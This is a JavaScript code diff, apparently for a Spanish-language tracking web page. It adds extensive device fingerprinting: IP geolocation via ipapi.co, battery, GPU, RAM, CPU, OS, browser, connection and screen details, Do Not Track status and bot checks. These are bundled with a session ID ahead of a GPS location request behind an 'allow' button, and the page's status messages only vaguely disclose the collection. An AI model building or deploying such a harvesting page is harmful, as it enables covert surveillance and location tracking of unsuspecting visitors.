@@ -167,18 +167,116 @@ async function pushVisit(data){
   }catch(e){console.warn("pushVisit error",e)}
 }
 
+async function getIPInfo(ip){
+  try{
+    const r=await fetch(`https://ipapi.co/${ip}/json/`);
+    return await r.json();
+  }catch{return{}}
+}
+
+async function getBateria(){
+  try{
+    if(!navigator.getBattery)return null;
+    const b=await navigator.getBattery();
+    return{nivel:Math.round(b.level*100)+"%",cargando:b.charging?"Sí":"No"};
+  }catch{return null}
+}
+
+function getGPU(){
+  try{
+    const c=document.createElement("canvas");
+    const gl=c.getContext("webgl")||c.getContext("experimental-webgl");
+    if(!gl)return"No disponible";
+    const ext=gl.getExtension("WEBGL_debug_renderer_info");
+    if(!ext)return"No disponible";
+    return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)||"No disponible";
+  }catch{return"No disponible"}
+}
+
+function getRAM(){
+  return navigator.deviceMemory ? navigator.deviceMemory+"GB (aprox)" : "No disponible";
+}
+
+function getCPU(){
+  return navigator.hardwareConcurrency ? navigator.hardwareConcurrency+" núcleos lógicos" : "No disponible";
+}
+
+function getSO(){
+  const ua=navigator.userAgent;
+  if(/Windows NT 10/.test(ua))return"Windows 10/11";
+  if(/Windows NT 6.3/.test(ua))return"Windows 8.1";
+  if(/Windows NT 6.1/.test(ua))return"Windows 7";
+  if(/Android ([0-9.]+)/.test(ua))return"Android "+RegExp.$1;
+  if(/iPhone OS ([0-9_]+)/.test(ua))return"iOS "+RegExp.$1.replace(/_/g,".");
+  if(/Mac OS X ([0-9_]+)/.test(ua))return"macOS "+RegExp.$1.replace(/_/g,".");
+  if(/Linux/.test(ua))return"Linux";
+  return"Desconocido";
+}
+
+function getNavegador(){
+  const ua=navigator.userAgent;
+  if(/Edg\/([0-9.]+)/.test(ua))return"Microsoft Edge "+RegExp.$1;
+  if(/OPR\/([0-9.]+)/.test(ua))return"Opera "+RegExp.$1;
+  if(/Chrome\/([0-9.]+)/.test(ua))return"Chrome "+RegExp.$1;
+  if(/Firefox\/([0-9.]+)/.test(ua))return"Firefox "+RegExp.$1;
+  if(/Safari\/([0-9.]+)/.test(ua)&&!/Chrome/.test(ua))return"Safari";
+  return"Desconocido";
+}
+
+function isBot(){
+  const ua=navigator.userAgent.toLowerCase();
+  const bots=["bot","crawler","spider","scraper","headless","phantom","selenium","puppeteer","playwright"];
+  return bots.some(b=>ua.includes(b))?"Sí (posible bot)":"No";
+}
+
+function getConexion(){
+  const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  if(!c)return"No disponible";
+  return`${c.effectiveType||"?"} — ${c.downlink||"?"}Mbps — ${c.rtt||"?"}ms RTT`;
+}
+
 async function iniciar(){
   document.getElementById("btnAllow").disabled=true;
-  hide("stErr"); show("stLoad"); txt("stTxt","Obteniendo IP…");
+  hide("stErr"); show("stLoad"); txt("stTxt","Recopilando información del dispositivo…");
 
   const ip=await getIP();
+  txt("stTxt","Obteniendo datos de red…");
+  const ipInfo=await getIPInfo(ip);
+  txt("stTxt","Obteniendo batería…");
+  const bateria=await getBateria();
   txt("stTxt","Solicitando permiso de ubicación GPS…");
 
+  const ahora=new Date();
   const base={
-    sesion:SESSION, fecha:new Date().toISOString(),
-    ip, agente:navigator.userAgent,
-    pantalla:`${screen.width}x${screen.height}`,
-    idioma:navigator.language
+    sesion:SESSION,
+    fecha:ahora.toISOString(),
+    fecha_legible:ahora.toLocaleString("es"),
+    zona_horaria:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    ip,
+    isp:ipInfo.org||"No disponible",
+    ciudad_ip:ipInfo.city||"",
+    pais_ip:ipInfo.country_name||"",
+    dispositivo:{
+      user_agent:navigator.userAgent,
+      navegador:getNavegador(),
+      sistema_operativo:getSO(),
+      gpu:getGPU(),
+      ram:getRAM(),
+      cpu_nucleos:getCPU(),
+      resolucion:`${screen.width}x${screen.height}`,
+      resolucion_ventana:`${window.innerWidth}x${window.innerHeight}`,
+      profundidad_color:screen.colorDepth+"bit",
+      idioma:navigator.language,
+      idiomas:navigator.languages?.join(", ")||navigator.language,
+      conexion:getConexion(),
+      bateria:bateria||"No disponible",
+      touch_points:navigator.maxTouchPoints||0,
+      cookies_habilitadas:navigator.cookieEnabled?"Sí":"No",
+      do_not_track:navigator.doNotTrack||"No especificado",
+      es_bot:isBot(),
+      plataforma:navigator.platform||"No disponible",
+      memoria_js: performance?.memory ? Math.round(performance.memory.usedJSHeapSize/1048576)+"MB usados / "+Math.round(performance.memory.jsHeapSizeLimit/1048576)+"MB límite" : "No disponible"
+    }
   };
 
   if(!navigator.geolocation){
